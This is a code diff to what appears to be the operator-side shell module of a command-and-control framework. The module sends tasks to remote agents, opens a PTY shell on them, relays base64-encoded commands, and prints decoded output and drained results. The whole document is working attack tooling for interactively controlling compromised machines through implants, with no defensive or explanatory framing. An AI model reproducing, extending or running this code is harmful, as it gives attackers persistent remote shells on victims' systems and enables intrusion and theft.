@@ -1,64 +1,76 @@
 import base64
+import sys
 import time
 import re
+from colorama import Fore, Style
 
 
 def strip_ansi(text):
     return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", text)
 
 
+def _write(data):
+    sys.stdout.write(data)
+    sys.stdout.flush()
+
+
 def run_shell(manager, agent_id, c2_server):
-    print(f"[*] Entering interactive shell with agent {agent_id}")
-    print("[*] Type 'exit' to return to menu")
-    print()
+    _write(f"{Fore.CYAN}[*] PTY shell for agent {agent_id}{Style.RESET_ALL}\n")
+    _write(f"{Fore.CYAN}[*] Type 'exit' to return{Style.RESET_ALL}\n\n")
+
+    tid = manager.send_task(agent_id, "SHELL:", {})
+    if not tid:
+        _write("[!] Agent not found\n")
+        return
+
+    ready = False
+    for _ in range(20):
+        time.sleep(0.5)
+        for r in manager.consume_results(agent_id):
+            out = r.get("output", "")
+            if out.startswith("SHELL:ready:"):
+                data = strip_ansi(base64.b64decode(out[11:]).decode())
+                _write(data)
+                ready = True
+                break
+        if ready:
+            break
+
+    if not ready:
+        _write("[!] Shell failed\n")
+        return
 
     while True:
         try:
-            cmd = input(f"shell@{agent_id}> ")
+            cmd = input()
         except (EOFError, KeyboardInterrupt):
-            print()
+            _write("\n")
             break
 
-        if cmd.lower() in ("exit", "quit"):
+        if cmd.strip() in ("exit", "quit"):
             break
         if not cmd.strip():
             continue
 
-        task_id = manager.send_task(
-            agent_id, "shell_interactive", {"command": cmd.strip()}
-        )
-        if not task_id:
-            print("[!] Agent not found")
-            break
+        b64 = base64.b64encode(cmd.encode()).decode()
+        tid = manager.send_task(agent_id, f"SHELL_CMD:{b64}", {})
 
         for _ in range(30):
             time.sleep(0.3)
-            results = manager.get_results(agent_id)
-            for r in results:
-                if r["task_id"] == task_id:
-                    out = r["output"]
-                    if out:
-                        print(out, end="" if out.endswith("\n") else "\n")
-                    break
-            else:
-                continue
-            break
-        else:
-            print("[!] Timeout")
-
-        # Drain SHELL_DRAIN results while idle
-        for _ in range(4):
-            time.sleep(0.3)
-            results = manager.get_results(agent_id)
-            for r in results:
+            for r in manager.consume_results(agent_id):
                 out = r.get("output", "")
-                if out.startswith("SHELL_DRAIN:"):
+                if r.get("task_id") == tid:
                     try:
-                        data = strip_ansi(
-                            base64.b64decode(out[12:]).decode(errors="replace")
-                        )
-                        if data.strip():
-                            print(data, end="")
+                        data = strip_ansi(base64.b64decode(out).decode())
+                    except Exception:
+                        data = out
+                    _write(data)
+                elif out.startswith("SHELL_DRAIN:"):
+                    try:
+                        data = strip_ansi(base64.b64decode(out[12:]).decode())
+                        _write(data)
                     except Exception:
                         pass
-                    r["output"] = ""
+                elif out.startswith("SHELL:exited"):
+                    _write("\n[+] Shell exited\n")
+                    return
